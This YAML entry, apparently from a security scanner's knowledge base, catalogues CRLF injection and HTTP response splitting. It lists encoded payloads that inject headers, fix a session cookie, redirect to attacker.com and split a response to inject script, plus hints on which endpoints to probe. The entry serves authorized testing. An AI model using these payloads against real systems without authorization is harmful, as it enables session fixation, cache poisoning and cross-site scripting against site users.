id: CRLF
name: CRLF Injection / HTTP Response Splitting
cwe:
- CWE-93
- CWE-113
owasp: A03:2021 Injection
severity_range: Medium - High
description: Inject CRLF (\r\n) into HTTP responses to split responses, inject headers, or perform XSS.
detection:
  payloads:
  - test%0d%0aHeader-Injected:%20yes
  - test%0d%0aSet-Cookie:%20session=attacker
  - test%0d%0a%0d%0a<html><script>alert(1)</script>
  - test\r\nLocation:%20https://attacker.com
  - test%E5%98%8A%E5%98%8DHeader-Injected:%20yes
  attack_classes:
    header_injection:
      description: Add custom headers to response
      exploitation: Inject Set-Cookie, X-XSS-Protection, etc.
      severity: medium
    response_splitting:
      description: Split response into two — second is attacker-controlled
      payload: test%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
      severity: high
    session_fixation:
      description: Inject Set-Cookie to fixate victim's session
      severity: high
    cache_poisoning_via_crlf:
      description: Poison cache with attacker-controlled response
      severity: high
    xss_via_crlf:
      description: Inject HTML body via CRLF split
      severity: high
ai_research_hints:
- Check Location header endpoints (redirects) — most common CRLF vector
- Custom logging headers, X-Forwarded-For-derived headers
- Email subject/recipient fields (email header injection — see email_injection)
- Cookie-setting endpoints with user input
references:
- https://owasp.org/www-community/attacks/CRLF_Injection
- https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a
